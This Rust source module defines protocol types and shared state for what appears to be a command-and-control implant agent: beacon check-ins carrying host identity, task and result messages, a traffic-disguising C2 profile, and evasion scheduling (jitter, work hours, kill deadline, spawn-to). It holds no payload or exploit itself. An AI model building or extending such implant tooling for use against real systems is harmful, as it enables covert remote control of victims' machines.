//! Wire-protocol types and shared runtime state.
//!
//! Port of `protocol/types.go` + `protocol/state.go`. The wire
//! types are the deserialisation targets for every endpoint; the
//! `SharedState` is the runtime-mutable subset of the Go
//! `state.go` globals — the values the server pushes to the
//! agent on a `/tasks` poll and the agent reads on the next loop
//! tick.
//!
//! # What moved where
//!
//! `state.go`'s package-level variables are split by lifetime:
//!
//! | Go variable | Rust home |
//! |-------------|-----------|
//! | `WireTLSProfile` | `config::TLS_PROFILE` |
//! | `DNSVerbB` / `DNSVerbT` / `DNSVerbR` | `config::DNS_VERB_*` |
//! | `DNSPayloadChunkSize` | `config::DNS_PAYLOAD_CHUNK_SIZE` |
//! | `DNSLabelTemplate` | `config::DNS_LABEL_TEMPLATE` |
//! | `ScheduleSleep` / `ScheduleJitter` / `ScheduleKill` / `ScheduleSpawnTo` | [`SharedState`] |
//! | `WorkHoursStart` / `WorkHoursEnd` | [`SharedState`] |
//!
//! The split is by mutability: build-time values are `const`s
//! emitted by `build.rs`; runtime values are protected state
//! the transport writes and the run loop reads.

use std::collections::BTreeMap;
use std::sync::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};

use serde::{Deserialize, Serialize};

pub mod fingerprint;
pub mod methods;
pub mod transport;

pub use fingerprint::*;
pub use methods::*;
pub use transport::{Transport, TransportError};

// =====================================================================
// Identity
// =====================================================================

/// The agent's identity. Sent in every check-in, and mixed into
/// the session fingerprint on the server side.
///
/// `identity_role` and `local_addr` are the only optional
/// fields; everything else is required and serialised even
/// when zero. `stager` is a bool with `omitempty`, which Go
/// treats as "omit when false."
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct Identity {
    pub hostname: String,
    pub username: String,
    pub machine_id: String,
    pub os: String,
    pub arch: String,
    pub proto: i32,
    pub kill_days: i32,
    pub work_start: i32,
    pub work_end: i32,

    #[serde(skip_serializing_if = "is_false")]
    pub stager: bool,

    #[serde(skip_serializing_if = "String::is_empty")]
    pub identity_role: String,

    #[serde(skip_serializing_if = "String::is_empty")]
    pub local_addr: String,
}

fn is_false(b: &bool) -> bool {
    !*b
}

// =====================================================================
// Check-in
// =====================================================================

/// The body of `POST /beacon`.
///
/// `identity` is always present. The three optional fields are
/// the ECDSA identity signature the full agent sends; the
/// stager sends none of them, and the server falls back to
/// trust-on-first-use with a session warning.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct CheckinRequest {
    pub identity: Identity,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub agent_pubkey: Option<String>,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub identity_sig: Option<String>,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub identity_ts: Option<i64>,
}

/// The body of the `POST /beacon` response.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct CheckinResponse {
    pub id: i32,
    pub sleep: i32,
    pub jitter: f64,
    pub kill_deadline: f64,
    pub proto: i32,

    #[serde(skip_serializing_if = "String::is_empty")]
    pub cookie: String,
}

// =====================================================================
// Task and result
// =====================================================================

/// A single queued task, delivered on `GET /tasks`.
///
/// `signature` is empty on an unsigned task; the caller drops
/// the task if verification is enabled and the signature does
/// not verify.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct Task {
    pub id: String,
    pub verb: String,
    pub args: Vec<String>,
    pub timeout: i32,

    #[serde(skip_serializing_if = "String::is_empty")]
    pub signature: String,
}

/// The body of `POST /results`.
///
/// `error` is empty on success. `output` is always present —
/// even an empty result carries `"output":""` on the wire —
/// because the server's task-completion path expects the field
/// to exist. `signature` is empty for an unsigned result.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct TaskResult {
    pub id: String,
    pub output: String,

    #[serde(skip_serializing_if = "String::is_empty")]
    pub error: String,

    pub exit_code: i32,

    #[serde(skip_serializing_if = "String::is_empty")]
    pub signature: String,
}

/// Alias for callers that prefer the shorter name. The wire
/// type is `TaskResult`; existing code that imports `Result`
/// should use this alias.
pub type Result = TaskResult;

// =====================================================================
// C2 profile
// =====================================================================

/// The C2 profile. Parsed from `TC2_PROFILE_JSON` at build
/// time and re-parsed by the agent at startup.
///
/// Every field except the three paths and the two header maps
/// is optional; [`Profile::resolved`] fills the rest.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct Profile {
    pub user_agent: String,
    pub linux_user_agent: String,
    pub beacon_path: String,
    pub tasks_path: String,
    pub results_path: String,

    pub extra_headers: BTreeMap<String, String>,
    pub request_headers: BTreeMap<String, String>,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<ProfileStatus>,

    #[serde(skip_serializing_if = "String::is_empty")]
    pub cookie_name: String,

    #[serde(skip_serializing_if = "BTreeMap::is_empty")]
    pub response_headers: BTreeMap<String, String>,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub stager: Option<ProfileStager>,
}

/// Per-role HTTP status codes. A zero field falls through to
/// the framework default on the transport side.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct ProfileStatus {
    #[serde(skip_serializing_if = "is_zero_i32")]
    pub beacon: i32,
    #[serde(skip_serializing_if = "is_zero_i32")]
    pub tasks: i32,
    #[serde(skip_serializing_if = "is_zero_i32")]
    pub results: i32,
    #[serde(skip_serializing_if = "is_zero_i32")]
    pub error: i32,
}

fn is_zero_i32(n: &i32) -> bool {
    *n == 0
}

/// The profile's `stager` block — an alternate URL the stager
/// fetches its payload from.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct ProfileStager {
    #[serde(skip_serializing_if = "String::is_empty")]
    pub path: String,
}

// =====================================================================
// Shared runtime state
// =====================================================================

/// The runtime-mutable subset of the Go `state.go` globals.
///
/// Every field is `Option<T>`: `None` means "the server has not
/// pushed a value yet," and the caller uses its own default.
/// The `-1` / `0` / `""` sentinels from Go are eliminated;
/// absence is representable in the type.
///
/// Access is via `Mutex<StateInner>`. Reads are short copies;
/// writes happen once per `/tasks` response. The lock is
/// released before any I/O, so a slow transport does not block
/// the run loop.
pub struct SharedState {
    inner: Mutex<StateInner>,
}

#[derive(Clone, Debug)]
struct StateInner {
    sleep: Option<u64>,
    jitter: Option<f64>,
    kill_deadline: Option<i64>,
    spawn_to: Option<String>,
    work_hours_start: u32,
    work_hours_end: u32,
}

/// A snapshot of the scheduling values, suitable for passing
/// across a single loop iteration without holding the lock.
#[derive(Clone, Debug)]
pub struct ScheduleSnapshot {
    pub sleep: Option<u64>,
    pub jitter: Option<f64>,
    pub kill_deadline: Option<i64>,
    pub spawn_to: Option<String>,
}

impl SharedState {
    /// Build the state from the build-time constants.
    ///
    /// The initial work-hours window comes from
    /// `config::WORK_HOURS_START` and `config::WORK_HOURS_END`,
    /// which the builder emits from the profile's
    /// `work_hours_start` / `work_hours_end` fields. Parsing
    /// follows the same `HH:MM` grammar the Go tree used; an
    /// unparseable value falls back to the 08:00–19:00 default.
    pub fn from_consts() -> Self {
        let start = crate::core::diag::parse_clock(
            crate::config::WORK_HOURS_START,
        )
        .unwrap_or(480);
        let end = crate::core::diag::parse_clock(
            crate::config::WORK_HOURS_END,
        )
        .unwrap_or(1140);
        Self {
            inner: Mutex::new(StateInner {
                sleep: None,
                jitter: None,
                kill_deadline: None,
                spawn_to: None,
                work_hours_start: start,
                work_hours_end: end,
            }),
        }
    }

    /// Snapshot the scheduling values.
    pub fn schedule(&self) -> ScheduleSnapshot {
        let g = self.inner.lock().expect("shared state poisoned");
        ScheduleSnapshot {
            sleep: g.sleep,
            jitter: g.jitter,
            kill_deadline: g.kill_deadline,
            spawn_to: g.spawn_to.clone(),
        }
    }

    /// Current sleep interval, or `default` if the server has
    /// not pushed one.
    pub fn sleep_or(&self, default: u64) -> u64 {
        self.inner
            .lock()
            .expect("shared state poisoned")
            .sleep
            .unwrap_or(default)
    }

    /// Current jitter, or `default` if unset.
    pub fn jitter_or(&self, default: f64) -> f64 {
        self.inner
            .lock()
            .expect("shared state poisoned")
            .jitter
            .unwrap_or(default)
    }

    /// Current kill deadline, or `None` if unset. A `Some`
    /// value is a Unix timestamp in seconds.
    pub fn kill_deadline(&self) -> Option<i64> {
        self.inner
            .lock()
            .expect("shared state poisoned")
            .kill_deadline
    }

    /// Current `spawnto` override, or `None` if unset.
    pub fn spawn_to(&self) -> Option<String> {
        self.inner
            .lock()
            .expect("shared state poisoned")
            .spawn_to
            .clone()
    }

    /// Work-hours window as `(start_minutes, end_minutes)`.
    /// `start == end` means "no window" (always inside).
    pub fn work_hours(&self) -> (u32, u32) {
        let g = self.inner.lock().expect("shared state poisoned");
        (g.work_hours_start, g.work_hours_end)
    }

    /// Apply a batch of scheduling updates. `None` leaves the
    /// existing value alone.
    ///
    /// The transport calls this after parsing `X-Beacon-*`
    /// headers on a `/tasks` response. Every field is optional
    /// because the server may push any subset.
    pub fn update_schedule(&self, updates: ScheduleUpdates) {
        let mut g = self.inner.lock().expect("shared state poisoned");
        if let Some(v) = updates.sleep {
            g.sleep = Some(v);
        }
        if let Some(v) = updates.jitter {
            g.jitter = Some(v);
        }
        if let Some(v) = updates.kill_deadline {
            g.kill_deadline = Some(v);
        }
        if let Some(v) = updates.spawn_to {
            // The server uses the sentinel `-` to mean "clear
            // the override." An empty string is never pushed.
            if v == "-" {
                g.spawn_to = None;
            } else {
                g.spawn_to = Some(v);
            }
        }
        if let (Some(start), Some(end)) =
            (updates.work_hours_start, updates.work_hours_end)
        {
            g.work_hours_start = start;
            g.work_hours_end = end;
        }
    }
}

/// A batch of scheduling updates pushed by a `/tasks`
/// response.
///
/// Every field is optional; an absent field means "the server
/// did not push a new value on this poll." The transport parses
/// the `X-Beacon-*` headers into this struct and hands it to
/// [`SharedState::update_schedule`].
#[derive(Clone, Debug, Default)]
pub struct ScheduleUpdates {
    pub sleep: Option<u64>,
    pub jitter: Option<f64>,
    pub kill_deadline: Option<i64>,
    pub spawn_to: Option<String>,
    pub work_hours_start: Option<u32>,
    pub work_hours_end: Option<u32>,
}

// =====================================================================
// Helpers
// =====================================================================

/// Current Unix time in seconds.
///
/// Used by identity signing and by the kill-deadline
/// comparison. A clock behind 1970 yields `0`, which is safe
/// as a "not yet" value for the deadline comparison.
pub fn unix_now_secs() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}